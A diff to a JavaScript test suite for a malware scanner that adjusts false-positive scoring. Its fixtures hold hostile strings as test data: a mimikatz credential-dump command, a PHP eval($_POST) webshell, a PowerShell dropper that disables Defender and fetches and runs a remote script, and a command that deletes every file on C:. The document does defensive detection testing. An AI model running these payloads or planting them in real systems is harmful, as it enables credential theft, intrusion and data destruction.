@@ -1047,14 +1047,17 @@ async function auditPowerExtra() {
       const hits = S.matchTextPatterns(strBytes('data:application/x-msdownload;base64,TVqQ'));
       assert(hits.some((h) => h.id === 'DATA-URI-EXE'));
     }],
-    ['power: LSASS dump detected as critical', () => {
+    ['power: LSASS dump detected (suspicious+ in plain text, infected in script)', () => {
       const { sandbox } = makeSandbox();
       loadScript('signatures.js', sandbox);
       loadScript('scanner.js', sandbox);
       const Sc = sandbox.Scanner;
-      const r = Sc.analyzeBytes('tool.txt', strBytes('mimikatz privilege::debug sekurlsa::logonpasswords'), 40);
-      assert(r.verdict === 'infected', 'mimikatz -> infected, got ' + r.verdict);
-      assert(r.signatures.includes('MIMIKATZ-STRING'));
+      const inScript = Sc.analyzeBytes('dump.ps1', strBytes('mimikatz privilege::debug sekurlsa::logonpasswords'), 40, 'C:\\Temp\\dump.ps1');
+      assert(inScript.verdict === 'infected', 'mimikatz in .ps1 -> infected, got ' + inScript.verdict);
+      assert(inScript.signatures.includes('MIMIKATZ-STRING'));
+      const inTxt = Sc.analyzeBytes('notes.txt', strBytes('mimikatz privilege::debug sekurlsa::logonpasswords'), 40, '/home/x/notes.txt');
+      assert(inTxt.verdict === 'clean' || inTxt.verdict === 'suspicious', 'plain .txt mention -> not infected, got ' + inTxt.verdict);
+      assert(inTxt.signatures.includes('MIMIKATZ-STRING'), 'signature still reported (transparency)');
     }],
     ['power: ransomware kill-chain (shadow copies + crypto) detected', () => {
       const { sandbox } = makeSandbox();
@@ -1266,3 +1269,85 @@ async function auditPowerExtra() {
 }
 
 setTimeout(() => { auditPowerExtra().catch((e) => { console.error(e); process.exit(1); }); }, 300);
+
+async function auditFalsePositiveFix() {
+  const P = [
+    ['fp-fix: python source mentioning ransom is clean', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('app.py', strBytes('# ransom note test: your files are encrypted, pay bitcoin'), 60, '/home/x/src/app.py');
+      assert(r.verdict === 'clean', 'py source -> clean, got ' + r.verdict + ' score ' + r.score);
+      assert(r.reasons.some((x) => x.includes('false positive')), 'adjustment reason present');
+    }],
+    ['fp-fix: ts source with Invoke-WebRequest is clean', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('etat.ts', strBytes('Invoke-WebRequest http://x | Invoke-Expression'), 50, '/home/x/src/etat.ts');
+      assert(r.verdict === 'clean', 'ts source -> clean, got ' + r.verdict);
+    }],
+    ['fp-fix: tests.py with ransom word is clean', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('tests.py', strBytes('assert ransom_note_detected'), 30, '/home/x/tests/tests.py');
+      assert(r.verdict === 'clean', 'tests.py -> clean, got ' + r.verdict);
+    }],
+    ['fp-fix: php webshell stays infected', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('shell.php', strBytes('<?php eval($_POST["c"]); ?>'), 30, '/var/www/html/shell.php');
+      assert(r.verdict === 'infected', 'php webshell still infected, got ' + r.verdict);
+    }],
+    ['fp-fix: ps1 dropper in temp stays infected', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('svchost.ps1', strBytes('Set-MpPreference -DisableRealtimeMonitoring $true; Invoke-WebRequest http://1.2.3.4/x.ps1 | iex'), 80, 'C:\\Users\\u\\AppData\\Local\\Temp\\svchost.ps1');
+      assert(r.verdict === 'infected', 'ps1 dropper infected, got ' + r.verdict);
+      assert(r.score >= 80);
+    }],
+    ['fp-fix: destructive bat on Desktop stays infected', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('evil.bat', strBytes('del /s /q C:\\*.*'), 20, 'C:\\Users\\u\\Desktop\\evil.bat');
+      assert(r.verdict === 'infected', 'bat -> infected, got ' + r.verdict);
+    }],
+    ['fp-fix: source in trusted dir (src/) reduced', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const r = Sc.analyzeBytes('helper.js', strBytes('eval(atob("AAAA"))'), 20, '/home/x/project/src/helper.js');
+      assert(r.verdict === 'clean' || r.verdict === 'suspicious', 'src/ js reduced, got ' + r.verdict);
+    }],
+    ['fp-fix: same payload outside trusted dir is full weight', () => {
+      const { sandbox } = makeSandbox();
+      loadScript('signatures.js', sandbox);
+      loadScript('scanner.js', sandbox);
+      const Sc = sandbox.Scanner;
+      const payload = strBytes('<?php eval($_POST["c"]);');
+      const inWeb = Sc.analyzeBytes('shell.php', payload, 20, '/var/www/shell.php');
+      assert(inWeb.score >= 80, 'php full weight: ' + inWeb.score);
+    }],
+  ];
+  let pass = 0, fail = 0;
+  for (const [name, fn] of P) {
+    try { await fn(); pass++; console.log('  ✔ ' + name); }
+    catch (e) { fail++; console.log('  ✕ ' + name + ': ' + e.message); }
+  }
+  console.log(`\n[fp-fix] ${pass} passed, ${fail} failed`);
+  if (fail) process.exit(1);
+  console.log('[fp-fix] all false-positive-fix tests passed ✔');
+}
+
+setTimeout(() => { auditFalsePositiveFix().catch((e) => { console.error(e); process.exit(1); }); }, 400);
